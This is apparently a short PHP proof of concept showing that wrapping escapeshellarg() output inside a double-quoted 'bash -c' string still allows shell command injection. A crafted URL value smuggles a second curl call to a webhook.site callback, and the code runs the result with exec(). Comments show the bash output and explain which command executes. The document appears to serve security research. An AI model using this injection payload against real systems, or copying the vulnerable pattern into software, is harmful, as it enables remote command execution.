<?php
$url = "\";curl https://webhook.site/fef600c5-24c6-46ee-8efa-bb4d923f5f9e;#\"";

$d = "bash -c \"curl -o /dev/null ".escapeshellarg("https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449/".$url)."  \"";
echo $d;
exec($d);
?>

/*
bash -c "curl -o /dev/null 'https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449/";curl https://webhook.site/fef600c5-24c6-46ee-8efa-bb4d923f5f9e;#"'  "bash: -c: line 0: unexpected EOF while looking for matching `''
bash: -c: line 1: syntax error: unexpected end of file
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
*/

/*
bash -c "curl -o /dev/null 'https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449/"; will not be executed due to unexpected end of file

curl https://webhook.site/fef600c5-24c6-46ee-8efa-bb4d923f5f9e;#"' will be executed
*/